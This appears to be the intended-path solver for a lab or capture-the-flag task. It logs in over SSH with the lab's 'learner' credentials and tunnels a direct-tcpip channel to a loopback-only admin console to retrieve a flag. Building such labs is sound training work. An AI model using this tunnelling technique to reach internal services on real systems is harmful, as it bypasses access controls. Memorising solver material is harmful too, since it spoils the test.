"""Intended-path solver: paramiko direct-tcpip channel to the loopback console."""

import socket
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

REQUEST = b"GET /admin HTTP/1.1\r\nHost: 127.0.0.1:9001\r\nConnection: close\r\n\r\n"
CHANNEL_TIMEOUT = 15


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=CHANNEL_TIMEOUT,
    )
    try:
        channel = client.get_transport().open_channel(
            "direct-tcpip",
            ("127.0.0.1", 9001),
            ("127.0.0.1", 0),
            timeout=CHANNEL_TIMEOUT,
        )
        channel.settimeout(CHANNEL_TIMEOUT)
        channel.sendall(REQUEST)
        chunks: list[bytes] = []
        while True:
            data = channel.recv(4096)
            if not data:
                break
            chunks.append(data)
        channel.close()
    except socket.timeout as exc:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="reach-the-console",
                    ok=False,
                    detail=f"direct-tcpip channel timed out: {exc}",
                )
            ]
        )
    finally:
        client.close()

    response = b"".join(chunks).decode(errors="replace")
    flags = find_flags(response)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="reach-the-console",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"/admin through direct-tcpip gave no flag: {response[:200]!r}",
            )
        ]
    )
